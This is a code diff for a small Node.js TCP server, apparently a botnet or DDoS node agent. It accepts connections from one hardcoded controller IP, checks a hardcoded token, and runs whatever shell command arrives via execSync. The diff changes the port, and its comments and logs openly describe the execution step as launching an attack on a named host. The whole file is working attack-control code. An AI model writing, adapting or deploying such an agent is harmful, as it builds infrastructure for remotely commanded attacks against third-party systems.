@@ -1,15 +1,15 @@
 const net = require('net');
 const exec = require('child_process').execSync;
 
-const socket_port = 3000; // cổng API
-const socket_token = "daukute432000"; //mã thông báo bí mật của bạn để bảo vệ kết nối TCP
-const allowed_ips = ['192.53.114.92']; // IP máy chủ API
+const socket_port = 8888;
+const socket_token = "daukute432000";
+const allowed_ips = ['192.53.114.92'];
 
 const server = net.createServer((socket) => {
 
     const remoteAddress = socket.remoteAddress.replace(/^.*:/, '');
     if (!allowed_ips.includes(remoteAddress)) {
-        console.log(`Không cho phép kết nối từ ${remoteAddress}`);
+        console.log(`Connection from ${remoteAddress} not allowed`);
         socket.write('failed');
         socket.end();
         return;
@@ -24,14 +24,14 @@ const server = net.createServer((socket) => {
                 socket.end();
             }
 
-            //launch attack
+            //khởi động cuộc tấn công
             exec(json.command, function (error, stdout, stderr) {});
 
-            console.log(`Đã nhận lệnh từ API: "${json.command}"`)
+            console.log(`bắt đầu tấn công vào ${json.host}`)
         
             socket.write('success');
         } catch (e) {
-            console.log(`Không chạy được lệnh, ${e}`)
+            console.log(`không bắt đầu tấn công được ${e}`)
         
             socket.write('failed');
             socket.end();
@@ -44,5 +44,5 @@ const server = net.createServer((socket) => {
 });
 
 server.listen(socket_port, () => {
-    console.log(`Máy chủ đang nghe ${socket_port}`);
+    console.log(`Máy chủ đang lắng nghe trên ${socket_port}`);
 });
